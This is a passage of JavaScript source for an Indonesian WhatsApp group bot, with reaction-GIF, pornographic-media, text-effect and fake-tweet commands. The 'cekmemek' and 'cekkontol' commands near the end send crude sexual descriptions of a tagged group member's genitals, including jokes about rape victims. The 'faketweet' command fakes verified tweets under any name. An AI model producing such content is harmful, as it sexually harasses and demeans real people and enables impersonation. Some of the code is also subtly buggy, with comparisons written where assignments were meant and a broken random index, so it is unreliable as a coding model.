                      } catch {
                        users == "none"
                        ment = [messsender, m.sender]
                      }
                      if (users == "none") {
                       musers = `@${m.sender.split("@")[0]} blushed themself!`
                      } else {
                       musers = `@${m.sender.split("@")[0]} blushed @${users.split("@")[0]} `
                      }
                      const response = await axios.get(pat.url, { responseType: 'arraybuffer' })
                      const buffer = Buffer.from(response.data, "utf-8")
                      var fetchedgif = await GIFBufferToVideoBuffer(buffer)
              hanz.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })
                    } catch (error) {
                    console.log(error);
                    }
                  }
                    break;
                    case 'smug': {
                      if (!m.isGroup) return onlyToko()
                      await loading()
                    if (!m.mentionedJid[0] && !m.quoted) return reply(`Tag or reply to a person`)
                    var pat = await fetchJson(`https://api.waifu.pics/sfw/smug`)
                    try {
                  let messsender = m.sender
                      let musers = ``
                     try {
                      let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                      var  ment = [messsender, users]
                      } catch {
                        users == "none"
                        ment = [messsender, m.sender]
                      }
                     if (users == "none") {
                       musers = `@${m.sender.split("@")[0]} smugged themself!`
                      } else {
                       musers = `@${m.sender.split("@")[0]} smugged @${users.split("@")[0]} `
                      }
                     const response = await axios.get(pat.url, { responseType: 'arraybuffer' })
                      const buffer = Buffer.from(response.data, "utf-8")
                      var fetchedgif = await GIFBufferToVideoBuffer(buffer)
             hanz.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })
                    } catch (error) {
                      console.log(error);
                    }
                  }
                    break;
                    case 'glomp': {
                      if (!m.isGroup) return onlyToko()
                      await loading()
                    if (!m.mentionedJid[0] && !m.quoted) return setReply(`Tag or reply to a person`)
                    var pat = await fetchJson(`https://api.waifu.pics/sfw/glomp`)
                    try {
                      let messsender = m.sender
                      let musers = ``
                      try {
                       let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                       var ment = [messsender, users]
                      } catch {
                        users == "none"
                        ment = [messsender, m.sender]
                      }
                      if (users == "none") {
                       musers = `@${m.sender.split("@")[0]} glomped themself!`
                      } else {
                       musers = `@${m.sender.split("@")[0]} glomped @${users.split("@")[0]} `
                      }
                      const response = await axios.get(pat.url, { responseType: 'arraybuffer' })
                      const buffer = Buffer.from(response.data, "utf-8")
                      var fetchedgif = await GIFBufferToVideoBuffer(buffer)
               hanz.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })
                    } catch (error) {
                      console.log(error);
                    }
                  }
                    break;
                    case 'happy': {
                      if (!m.isGroup) return onlyToko()
                      await loading()
                    if (!m.mentionedJid[0] && !m.quoted) return setReply(`Tag or reply to a person`)
                    var pat = await fetchJson(`https://api.waifu.pics/sfw/happy`)
                    try {
                      let messsender = m.sender
                      let musers = ``
                      try {
                       let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                      var ment = [messsender, users]
                      } catch {
                        users == "none"
                        ment = [messsender, m.sender]
                      }
                      if (users == "none") {
                       musers = `@${m.sender.split("@")[0]} happied themself!`
                      } else {
                       musers = `@${m.sender.split("@")[0]} happied @${users.split("@")[0]} `
                      }
                      const response = await axios.get(pat.url, { responseType: 'arraybuffer' })
                      const buffer = Buffer.from(response.data, "utf-8")
                      var fetchedgif = await GIFBufferToVideoBuffer(buffer)
                hanz.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })
                    } catch (error) {
                      console.log(error);
                    }
                  }
                    break;
                    case 'dance': {
                      if (!m.isGroup) return onlyToko()
                      await loading()
                    if (!m.mentionedJid[0] && !m.quoted) return setReply(`Tag or reply to a person`)
                    var pat = await fetchJson(`https://api.waifu.pics/sfw/dance`)
                    try {
                      let messsender = m.sender
                      let musers = ``
                      try {
                      let  users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                       var ment = [messsender, users]
                      } catch {
                        users == "none"
                        ment = [messsender, m.sender]
                      }
                      if (users == "none") {
                       musers = `@${m.sender.split("@")[0]} danced themself!`
                      } else {
                       musers = `@${m.sender.split("@")[0]} danced @${users.split("@")[0]} `
                      }
                      const response = await axios.get(pat.url, { responseType: 'arraybuffer' })
                      const buffer = Buffer.from(response.data, "utf-8")
                      var fetchedgif = await GIFBufferToVideoBuffer(buffer)
             hanz.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })
                    } catch (error) {
                      console.log(error);
                    }
                  }
                    break;
                    case 'cringe': {
                      if (!m.isGroup) return onlyToko()
                      await loading()
                    if (!m.mentionedJid[0] && !m.quoted) return reply(`Tag or reply to a person`)
                    var pat = await fetchJson(`https://api.waifu.pics/sfw/cringe`)
                    try {
                      let messsender = m.sender
                      let musers = ``
                      try {
                       let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                       var ment = [messsender, users]
                      } catch {
                        users == "none"
                        ment = [messsender, m.sender]
                      }
                      if (users == "none") {
                       musers = `@${m.sender.split("@")[0]} cringed themself!`
                      } else {
                       musers = `@${m.sender.split("@")[0]} cringed @${users.split("@")[0]} `
                      }
                      const response = await axios.get(pat.url, { responseType: 'arraybuffer' })
                      const buffer = Buffer.from(response.data, "utf-8")
                      var fetchedgif = await GIFBufferToVideoBuffer(buffer)
              hanz.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })
                    } catch (error) {
                      console.log(error);
                    }
                  }
                    break;
                    case 'cuddle': {
                      if (!m.isGroup) return onlyToko()
                      await loading()
                    if (!m.mentionedJid[0] && !m.quoted) return setReply(`Tag or reply to a person`)
                    var pat = await fetchJson(`https://api.waifu.pics/sfw/cuddle`)
                    try {
                      let messsender = m.sender
                      let musers = ``
                      try {
                       let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                      var  ment = [messsender, users]
                      } catch {
                        users == "none"
                        ment = [messsender, m.sender]
                      }
                      if (users == "none") {
                       musers = `@${m.sender.split("@")[0]} cuddled themself!`
                      } else {
                       musers = `@${m.sender.split("@")[0]} cuddled @${users.split("@")[0]} `
                      }
                      const response = await axios.get(pat.url, { responseType: 'arraybuffer' })
                      const buffer = Buffer.from(response.data, "utf-8")
                      var fetchedgif = await GIFBufferToVideoBuffer(buffer)
              hanz.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })
                    } catch (error) {
                      console.log(error);
                    }
                  }
                    break;
                    case 'highfive': {
                      if (!m.isGroup) return onlyToko()
                      await loading()
                    if (!m.mentionedJid[0] && !m.quoted) return setReply(`Tag or reply to a person`)
                    var pat = await fetchJson(`https://api.waifu.pics/sfw/awoo`)
                    try {
                      let messsender = m.sender
                      let musers = ``
                      try {
                       let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                      var  ment = [messsender, users]
                      } catch {
                        users == "none"
                        ment = [messsender, m.sender]
                      }
                      if (users == "none") {
                       musers = `@${m.sender.split("@")[0]} highfived themself!`
                      } else {

                       musers = `@${m.sender.split("@")[0]} highfived @${users.split("@")[0]} `
                      }
                      const response = await axios.get(pat.url, { responseType: 'arraybuffer' })
                      const buffer = Buffer.from(response.data, "utf-8")
                      var fetchedgif = await GIFBufferToVideoBuffer(buffer)
              hanz.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })
                    } catch (error) {
                      console.log(error);
                    }
                  }
                    break;
                    case 'handhold': {
                      if (!m.isGroup) return onlyToko()
                      await loading()
                    if (!m.mentionedJid[0] && !m.quoted) return reply(`Tag or reply to a person`)
                    var pat = await fetchJson(`https://api.waifu.pics/sfw/handhold`)
                    try {
                      let messsender = m.sender
                      let musers = ``
                      try {
                      let  users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                      var  ment = [messsender, users]
                      } catch {
                        users == "none"
                        ment = [messsender, m.sender]
                      }
                      if (users == "none") {
                       musers = `@${m.sender.split("@")[0]} handheld themself!`
                      } else {
                       musers = `@${m.sender.split("@")[0]} handheld @${users.split("@")[0]} `
                      }
                      const response = await axios.get(pat.url, { responseType: 'arraybuffer' })
                      const buffer = Buffer.from(response.data, "utf-8")
                      var fetchedgif = await GIFBufferToVideoBuffer(buffer)
              hanz.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })
                    } catch (error) {
                      console.log(error);
                    }
                  }
                    break;
                            
                    case 'feed': {
                      if (!m.isGroup) return onlyToko()
                      await loading()
                    if (!m.mentionedJid[0] && !m.quoted) return setReply(`Tag or reply to a person`)
                    var pat = await fetchJson(`https://nekos.life/api/v2/img/feed`)
                    try {
                      let messsender = m.sender
                      let musers = ``
                      try {
                       let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                      var  ment = [messsender, users]
                      } catch {
                        users == "none"
                        ment = [messsender, m.sender]
                      }
                      if (users == "none") {
                       musers = `@${m.sender.split("@")[0]} fed themself!`
                      } else {
                       musers = `@${m.sender.split("@")[0]} fed @${users.split("@")[0]} `
                      }
                      const response = await axios.get(pat.url, { responseType: 'arraybuffer' })
                      const buffer = Buffer.from(response.data, "utf-8")
                      var fetchedgif = await GIFBufferToVideoBuffer(buffer)
              hanz.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })
                    } catch (error) {
                      console.log(error);
                    }
                  }
                    break;
                            case 'tickle': {
                              if (!m.isGroup) return onlyToko()
                              
                    if (!m.mentionedJid[0] && !m.quoted) return setReply(`Tag atau reply orangnya`)
 await loading()
                    var pat = await fetchJson(`https://nekos.life/api/v2/img/tickle`)
                    try {
                      let messsender = m.sender
                      let musers = ``
                      try {
                      let  users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                       var ment = [messsender, users]
                      } catch {
                        users == "none"
                        ment = [messsender, m.sender]
                      }
                      if (users == "none") {
                       musers = `@${m.sender.split("@")[0]} tickled themself!`
                      } else {
                       musers = `@${m.sender.split("@")[0]} tickled @${users.split("@")[0]} `
                      }
                      const response = await axios.get(pat.url, { responseType: 'arraybuffer' })
                      const buffer = Buffer.from(response.data, "utf-8")
                      var fetchedgif = await GIFBufferToVideoBuffer(buffer)
                   hanz.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })
                    } catch (error) {
                      console.log(error);
                    }
                  }
                    break
// =≠===≠=== FITUR  NSFW ========= //
    case 'paptt':
if (!q) return setReply(`Example 
${command} foto/video`)
let papttfoto = JSON.parse(fs.readFileSync('./json/paptt-foto.json'))
let papttvideo = JSON.parse(fs.readFileSync('./json/paptt-video.json'))
let titid1 = (pickRandom(papttfoto))
let titid2 = (pickRandom(papttvideo))
if (q == 'foto') {
setReply("Foto Akan Dikirim Lewat Private Chat ( *PC* )")
                hanz.sendMessage(m.sender, { image: { url: titid1 }, caption: 'Mana Tahan😛'}, { quoted: fkontak })
            } else if (q == 'video') {
setReply("Video Akan Dikirim Lewat Private Chat ( *PC* )")
                hanz.sendMessage(m.sender, { video: { url: titid2 }, caption: 'Mana Tahan🙈'}, { quoted: fkontak })
    db.data.users[sender].glimit -= 1     
}
break        
case 'spank': {
                              if (!m.isGroup) return onlyToko()
  if (!isAntiNsfw) return setReply(mess.nsfw)
                              await loading()
                    if (!m.mentionedJid[0] && !m.quoted) return setReply(`Tag or reply to a person`)
                    var pat = await fetchJson(`https://nekos.life/api/v2/img/spank`)
                    try {
                      let messsender = m.sender
                      let musers = ``
                      try {
                       let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                       var ment = [messsender, users]
                      } catch {
                        users == "none"
                        ment = [messsender, m.sender]
                      }
                      if (users == "none") {
                       musers = `@${m.sender.split("@")[0]} spanked themself!`
                      } else {
                       musers = `@${m.sender.split("@")[0]} spanked @${users.split("@")[0]} `
                      }
                      const response = await axios.get(pat.url, { responseType: 'arraybuffer' })
                      const buffer = Buffer.from(response.data, "utf-8")
                      var fetchedgif = await GIFBufferToVideoBuffer(buffer)
              hanz.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })
                    } catch (error) {
                      console.log(error);
                    }
                  }
                    break;
case 'hentaivid': case 'hentaivideo': {
	if (!m.isGroup) return onlyToko()
if (!isAntiNsfw) return m.reply(mess.nsfw)
                await setReply(mess.wait)
                const { hentai } = require('../lib/scraper.js')
               let anu = await hentai()
                let result912 = anu[Math.floor(Math.random(), anu.length)]
                hanz.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: ` Title : ${result912.title}\n Category : ${result912.category}\n Mimetype : ${result912.type}\n Views : ${result912.views_count}\n Shares : ${result912.share_count}\n Source : ${result912.link}\n Media Url : ${result912.video_1}` }, { quoted: m })
            }
            break
case 'trap' :
if (!isGroup) return onlyToko()
if (!isPremium) return onlyPrem()
if (!isAntiNsfw) return setReply(mess.nsfw)
await loading()
 let trap = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
hanz.sendMessage(m.chat, { caption: 'Dosa Tanggung Sendiri', image: { url:trap.data.url } }, { quoted: m })
break
case 'hneko' :
if (!isGroup) return onlyToko()
if (!isPremium) return onlyPrem()
if (!isAntiNsfw) return setReply(mess.nsfw)
   let hneko = await axios.get(`https://waifu.pics/api/nsfw/neko`)
hanz.sendMessage(m.chat, { caption: 'Dosa Tanggung Sendiri', image: { url:hneko.data.url } }, { quoted: m })
break
case 'nwaifu' :
if (!isGroup) return onlyToko()
if (!isPremium) return onlyPrem()
if (!isAntiNsfw) return setReply(mess.nsfw)
await setReply(mess.wait)
   let waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
hanz.sendMessage(m.chat, { caption: 'Dosa Tanggung Sendiri', image: { url:waifudd.data.url } }, { quoted: m })
break
case 'animespank':
if (!isGroup) return onlyToko()
if (!isPremium) return onlyPrem()
if (!isAntiNsfw) return m.reply(mess.nsfw)
await setReply(mess.wait)
let waifud = await axios.get(`https://nekos.life/api/v2/img/spank`)     
            await hanz.sendMessage(m.chat, { caption:  `Dosa Tanggung Sendiri`, image: {url:waifud.data.url} },{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'gifblowjob':
if (!m.isGroup) return onlyToko()
if (!isPremium) return onlyPrem()
if (!isAntiNsfw) return setReply(mess.nsfw)
await setReply(mess.wait)
  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff = await fetchBuffer(assss.data.url)
    var bogif = await buffergif(bobuff)
    await hanz.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
case 'blowjob':
    if (!m.isGroup) return onlyToko()
    if (!isPremium) return onlyPrem()
	if (!isAntiNsfw) return m.reply(mess.nsfw)
await setReply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./json/nsfw/blowjob.json'))
var xeonyresult = pickRandom(ahegaonsfw)
hanz.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'cuckold':
    if (!m.isGroup) return onlyToko()
    if (!isPremium) return onlyPrem()
    if (!isAntiNsfw) return setReply(mess.nsfw)
await setReply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./json/nsfw/cuckold.json'))
var xeonyresult = pickRandom(ahegaonsfw)
hanz.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'eba':
    if (!m.isGroup) return onlyToko()
    if (!isPremium) return onlyPrem()
    if (!isAntiNsfw) return setReply(mess.nsfw)
await setReply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./json/nsfw/eba.json'))
var xeonyresult = pickRandom(ahegaonsfw)
hanz.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'pussy':
    if (!m.isGroup) return onlyToko()
    if (!isPremium) return onlyPrem()
    if (!isAntiNsfw) return setReply(mess.nsfw)
await setReply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./json/nsfw/pussy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
hanz.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'yuri':
    if (!m.isGroup) return onlyToko()
    if (!isPremium) return onlyPrem()
    if (!isAntiNsfw) return setReply(mess.nsfw)
await setReply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./json/nsfw/yuri.json'))
var xeonyresult = pickRandom(ahegaonsfw)
hanz.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'zettai':
    if (!m.isGroup) return onlyToko()
    if (!isPremium) return onlyPrem()
    if (!isAntiNsfw) return setReply(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./json/nsfw/zettai.json'))
var xeonyresult = pickRandom(ahegaonsfw)
hanz.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
// =≠===== FITUR EPHOTO ==≠===== //
 case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{
if (!user.registered) { return sendButDaftar() }
if (!isGroup) return onlyToko()
if (!q) return setReply(`Example : ${prefix+command} Rangel`) 
await loading()
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
hanz.sendMessage(m.chat, { image: { url: haldwhd }, caption: mess.succes }, { quoted: m })
  db.data.users[sender].limit -= 1
}
break
// ====== FITUR TEXTPRO ======== //
 case 'flaming1':{
if (!isGroup) return onlyGroup()
if (args.length == 0) return setReply(`Example: ${prefix + command} Teks`)
if (!isPremium && global.db.data.users[sender].limit < 1) return onlyLimit()
setReply(mess.wait)
let ini_txt = args.join(" ")
var buffer = `https://flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=fluffy-logo&script=fluffy-logo&fontsize=90&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextColor=%23000&shadowGlowColor=%23000&backgroundColor=%23000&text=${ini_txt}`
hanz.sendMessage(from, { contextInfo: {externalAdReply: {showAdAttribution: true, title: wm, mediaType: 3,  renderLargerThumbnail : false,thumbnail:thumb,sourceUrl: `https://wa.me/${nomerOwner}`
}}, image: {url:buffer}, caption: `${mess.success}`}, { quoted: m})
.catch((err) => setReply('Server sedang error coba lagi besok!'))
db.data.users[sender].limit -= 1
}
break
 case 'flaming2':{
if (!isGroup) return onlyToko()
if (args.length == 0) return setReply(`Example: ${prefix + command} Teks`)
if (!isPremium && global.db.data.users[sender].limit < 1) return onlyLimit()
setReply(mess.wait)
let ini_txt = args.join(" ")
var buffer = `https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=fluffy-logo&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&text=${ini_txt}`
hanz.sendMessage(from, { contextInfo: {externalAdReply: {showAdAttribution: true, title: wm, mediaType: 3,  renderLargerThumbnail : false,thumbnail: thumb,sourceUrl: `https://wa.me/${nomerOwner}`
}}, image: {url:buffer}, caption: `${mess.success}`}, { quoted: m})
.catch((err) => setReply('Server sedang error coba lagi besok!'))
db.data.users[sender].limit -= 1
}
break
case 'flaming3':{
if (!isGroup) return onlyToko()
if (args.length == 0) return setReply(`Example: ${prefix + command} Teks`)
if (!isPremium && global.db.data.users[sender].limit < 1) return setReply(mess.limit)
setReply(mess.wait)
let ini_txt = args.join(" ")
var buffer = `https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&text=${ini_txt}`
hanz.sendMessage(from, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `${botName}`, mediaType: 3,  renderLargerThumbnail : false,thumbnail: thumb,sourceUrl: `https://wa.me/${nomerOwner}`
}}, image: {url:buffer}, caption: `${mess.success}`}, { quoted: m})
.catch((err) => setReply('Server sedang error coba lagi besok!'))
db.data.users[sender].limit -= 1
}
break
case 'flaming4':{
if (!isGroup) return onlyToko()
if (args.length == 0) return setReply(`Example: ${prefix + command} Teks`)
if (!isPremium && global.db.data.users[sender].limit < 1) return setReply(mess.limit)
setReply(mess.wait)
let ini_txt = args.join(" ")
var buffer = `https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&fillColor1Color=%23f2aa4c&fillColor2Color=%23f2aa4c&fillColor3Color=%23f2aa4c&fillColor4Color=%23f2aa4c&fillColor5Color=%23f2aa4c&fillColor6Color=%23f2aa4c&fillColor7Color=%23f2aa4c&fillColor8Color=%23f2aa4c&fillColor9Color=%23f2aa4c&fillColor10Color=%23f2aa4c&fillOutlineColor=%23f2aa4c&fillOutline2Color=%23f2aa4c&backgroundColor=%23101820&text=${ini_txt}`
hanz.sendMessage(from, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `${botName}`, mediaType: 3,  renderLargerThumbnail : false,thumbnailUrl:'https://telegra.ph/file/33d58a3a7b931d3902642.jpg',sourceUrl: `https://wa.me/${nomerOwner}`
}}, image: {url:buffer}, caption: `${mess.success}`}, { quoted: m})
.catch((err) => setReply('Server sedang error coba lagi besok!'))
db.data.users[sender].limit -= 1
}
break
case 'flaming5':{
if (!isGroup) return onlyToko()
if (args.length == 0) return setReply(`Example: ${prefix + command} Teks`)
if (!isPremium && global.db.data.users[sender].limit < 1) return setReply(mess.limit)
setReply(mess.wait)
let ini_txt = args.join(" ")
var buffer = `https://flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=water-logo&script=water-logo&fontsize=90&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextColor=%23000&shadowGlowColor=%23000&backgroundColor=%23000&text=${ini_txt}`
hanz.sendMessage(from, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `${botName}`, mediaType: 3,  renderLargerThumbnail : false,thumbnail: thumb,sourceUrl: `https://wa.me/${nomerOwner}`
}}, image: {url:buffer}, caption: `${mess.success}`}, { quoted: m})
.catch((err) => setReply('Server sedang error coba lagi besok!'))
db.data.users[sender].limit -= 1
}
break
case 'faketweet': {
    const canvafy = require('canvafy');
    if (!q) return m.reply(`Contoh: Name1 | Name2 | Text`);

    // Memisahkan input berdasarkan '|'
    const parts = q.split("|");
    if (parts.length < 3) return m.reply(`Format tidak valid. Contoh: Name1 | Name2 | Text`);

    const nama1 = parts[0].trim();  // Nama pengguna 1
    const nama2 = parts[1].trim();  // Nama pengguna 2
    const katakata = parts[2].trim();  // Teks tweet

    try {
        const tweet = await new canvafy.Tweet()
            .setTheme("light")
            .setUser({ displayName: nama1, username: nama2 })
            .setVerified(true)
            .setComment(katakata)
            .setAvatar(its) // pastikan 'its' adalah URL atau path yang valid
            .build();

        hanz.sendMessage(m.chat, { image: tweet, caption: '_succces_' }, { quoted: m });
    } catch (error) {
        console.error(error);
        m.reply(`Terjadi kesalahan saat membuat tweet: ${error.message}`);
    }
}
break;

// =≠====== FITUR PRIMBON ========//
case 'cekmemek':
 if (!isGroup) return onlyToko()
if (!q) return m.reply('tag temanmu!')
const persengayy = body.slice(0)
  const gay = ["*Udah Ga Perawan:v*\n• Warna Item🙈\n• Bulu Lebat\n• Katanya Polos Ko Lima Jari Lolos Chuackk","*Masih Perawan*\n• Warna Pink🤤\n• Tidak Berbulu\n• Wah Yang ini Buat Owner Ku Aja😋","*Bjir Bau 😵‍💫*\n\n• Kang Colmek\n• Sangat Lebat:v\n• Ishh Sarang Jin Itu😵","*Masih Perawan*\n• Warna Putih Mati\n• Masih Polos\n• Sepertinya Anda Butuh Kehangatan Dari Owner ku🥸 ","*Meki nya Semu Coklat*\n • Korban Pemerkosaan 😑\n• Lu Sih Main Ma Kumpulan Cowo Sengklek\n• Sebaiknya Jan Terlalu Gegabah 🤧","*Normal Seperti Biasanya*\n• Wuanjay Ko Bulu Nya Pada Kriput🙈\n• Ternyata Oh Ternyata Kamu Suka Lesby🫤","*Bahaya Noh Gan*\n• Udah Kena Virus\n• Kalo wik wik Ntar Ke Patil Cowoknya\n😶‍🌫️Takut BerNanah Kelamin Ku ntarr😬","*Lah Ireng Amat bjirr*\n• Hati² Sama Ni Orang Beneran Dah\n• Jangankan Pria Hewan Pun Dia Layani🫣","*74%*\n*Astagfirullah Kabur Gan🏃🌬️*"]
	const kl = gay[Math.floor(Math.random() * gay.length)]
   hanz.sendMessage(from, { contextInfo: { externalAdReply: { showAdAttribution: false,
title: `${week} , ${calender}ㅤㅤㅤㅤㅤㅤㅤㅤㅤ`,body:`⌜ ${ucapanWaktu} ⌟`,previewType:"PHOTO",thumbnail: thumb,sourceUrl: `https://www.instagram.com/ehanzdhoanx`,}
}, text :'Hasil Dari: *'+persengayy+'*\n\nJawaban : '+kl}, { quoted: fkontak })
break  
case 'cekkontol':
    if (!isGroup) return onlyToko();
    if (!q) return setReply('*CEKKONTOL* Izmi begitu!');

    const persenbucin = body.slice(0); // Ambil semua teks
    const bucin = [
        "Hadehh🤦\n[ Dah Item Bauk Lagi ishh🤮 ]",
